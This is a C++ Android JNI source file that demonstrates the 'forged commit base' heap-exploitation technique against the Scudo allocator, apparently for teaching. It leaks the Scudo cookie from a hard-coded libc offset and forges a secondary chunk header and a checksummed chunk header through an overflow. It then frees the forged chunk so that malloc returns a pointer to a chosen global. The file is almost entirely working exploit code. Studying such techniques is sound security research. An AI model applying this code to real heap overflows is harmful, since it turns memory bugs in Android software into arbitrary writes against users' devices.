#include <jni.h>
#include <cstdint>
#include <string>
#include <link.h>
#include <android/log.h>

/*
 * This exploit demonstrates the forged commit base attack on scudo.
 * Randomized allocation can be bypassed through retrying the exploit until two chunks are adjacent.
 * Ideas sourced from https://www.usenix.org/system/files/woot24-mao.pdf
 *
 * Requirements:
 *  - Heap overflow
 *  - Ability to allocate multiple chunks of size 0x40 or greater
 *  - Ability to allocate secondary chunks
 */

// Define log tags and shortcuts
#define LOG_TAG "FORGED_COMMIT_BASE"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define TRANSFER_BATCH_SIZE (13)

// Taken from scudo source
typedef struct UnpackedHeader {
    uintptr_t ClassId : 8;
    uint8_t State : 2;
    // Origin if State == Allocated, or WasZeroed otherwise.
    uint8_t OriginOrWasZeroed : 2;
    uintptr_t SizeOrUnusedBytes : 20;
    uintptr_t Offset : 16;
    uintptr_t Checksum : 16;
} UnpackedHeader;

typedef struct SecondaryChunkHeader {
    void *prev;        // +0x00
    void *next;        // +0x08
    uintptr_t commit_base; // +0x10
    uintptr_t commit_size; // +0x18
    uintptr_t mapped_base; // +0x20
    uintptr_t mapped_size; // +0x28
} SecondaryChunkHeader;



static uintptr_t libc_base;
alignas(16) char overwriteme[] = "overwriteme";

static int cb(struct dl_phdr_info *info, size_t size, void *data) {
    if (info->dlpi_name && strstr(info->dlpi_name, "/libc.so")) {
        libc_base = (uintptr_t)info->dlpi_addr;
        return 1;
    }
    return 0;
}

uint32_t leak_scudo_cookie() {
    dl_iterate_phdr(cb, nullptr);
    return *(volatile uint32_t *)(libc_base + 0xcc440);
}

uint64_t pack_header(UnpackedHeader unpacked_header) {
    uint64_t conv;
    std::memcpy(&conv, &unpacked_header, sizeof(uint64_t));
    return conv & 0x00ffffffffffffffULL;
}

// Taken from Scudo source
static uint32_t crc32_u64(uint32_t crc, uint64_t v) {
    crc ^= (uint32_t)v;
    for (int i = 0; i < 32; i++)
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & 1));

    crc ^= (uint32_t)(v >> 32);
    for (int i = 0; i < 32; i++)
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & 1));

    return crc;
}

static uintptr_t scudo_header_checksum(uintptr_t user_ptr,
                                       uint64_t packed_header, uint32_t cookie) {
    uint64_t zeroed = packed_header & 0x0000ffffffffffffULL;

    uint32_t crc = crc32_u64(cookie, (uint64_t)user_ptr);
    crc = crc32_u64(crc, zeroed);

    return (uintptr_t)(crc ^ (crc >> 16));
}


extern "C" JNIEXPORT void JNICALL
Java_xyz_cygnusx_forged_1commit_1base_MainActivity_run(
        JNIEnv* env,
        jobject /* this */) {

    // Leak the scudo cookie
    uint32_t cookie = leak_scudo_cookie();
    LOGI("First we need to leak the scudo cookie. In this libc version it is found at libc base + 0xcc440.\n Cookie: %x\n", cookie);
    LOGI("The forged commit base exploit targets the commit base field of a secondary chunk header.\n");
    LOGI("The exploit requires some primitive to overwrite a chunk header such as a heap overflow.\n");
    LOGI("At least one allocated secondary chunk is required at the time of use.\n");
    LOGI("We allocate it here: %p.\n", malloc(0x20000));
    LOGI("We choose chunks of size 0x40 or larger since the size of the secondary chunk header is 0x30. This could be worked around with a chunk that is more than one chunk away.");
    LOGI("The transfer batch size is 13 for chunks of user data size 0x40. So allocating 13 chunks should be enough to find two adjacent ones.\n");

    char* chunks[TRANSFER_BATCH_SIZE];
    for (int i = 0; i < TRANSFER_BATCH_SIZE; i++) {
        chunks[i] = (char*) malloc(0x40);
        LOGI("Transfer Batch %d: %p", i, chunks[i]);
    }


    // Look for adjacent chunks in our allocation array
    char *lo = NULL;
    char *hi = NULL;
    bool found_pair = false;
    for (size_t i = 0; i < TRANSFER_BATCH_SIZE && !found_pair; i++) {
        uintptr_t a = (uintptr_t)chunks[i];
        for (size_t j = i + 1; j < TRANSFER_BATCH_SIZE; j++) {
            uintptr_t b = (uintptr_t)chunks[j];
            if (a + 0x50 == b) {
                lo = chunks[i];
                hi = chunks[j];
                found_pair = true;
                break;
            }
            if (b + 0x50 == a) {
                lo = chunks[j];
                hi = chunks[i];
                found_pair = true;
                break;
            }
        }
    }

    if (!found_pair) {
        LOGE("No adjacent chunks found, retry.");
        return;
    }
    LOGI("We found adjacent chunk1 at: %p\n", lo);
    LOGI("And adjacent chunk2 at: %p\n", hi);

    char* chunk1 = lo;
    char* chunk2 = hi;

    LOGI("Next we overflow chunk1 to chunk2 with a fake secondary chunk header with an address we want to write to.");
    LOGI("The address to have malloc return must be 16 byte aligned");
    // Build the fake secondary chunk header
    const SecondaryChunkHeader fake_header = {
            .prev = nullptr,
            .next = nullptr,
            .commit_base = (uintptr_t) &overwriteme - 0x50,
            .commit_size = 0x20000 + 0x50,
            .mapped_base = 0x0,
            .mapped_size = 0x0
    };
    memcpy(chunk2 - 0x40, &fake_header, sizeof(SecondaryChunkHeader));

    LOGI("Next we overwrite the header of chunk2 to mark it as secondary.");

    // build a fake scudo header with a valid checksum.
    UnpackedHeader unpacked_header = {
            .ClassId = 0, // secondary class
            .State = 1, // allocated
            .OriginOrWasZeroed = 0,
            .SizeOrUnusedBytes = 0,
            .Offset = 0
    };
    uint64_t packed_header = pack_header(unpacked_header);


    // scudo checksum wants a tagged heap pointer
    uintptr_t user = (long) chunk2 & 0x00ffffffffffffffULL;
    uintptr_t scudo_ptr = user | 0x0200000000000000ULL;
    unpacked_header.Checksum = scudo_header_checksum(scudo_ptr, packed_header, cookie);

    memcpy(chunk1 + 0x40, &unpacked_header, sizeof(unpacked_header));

    LOGI("Next we free our newly forged secondary chunk");
    free(chunk2);

    LOGI("Now we demonstrate the next call to malloc returns the global var as a pointer");
    char* victim = (char*) malloc(0x20000);
    strcpy(victim, "aaaaaaaaaaa");
    LOGI("Overwriteme: %s", overwriteme);
}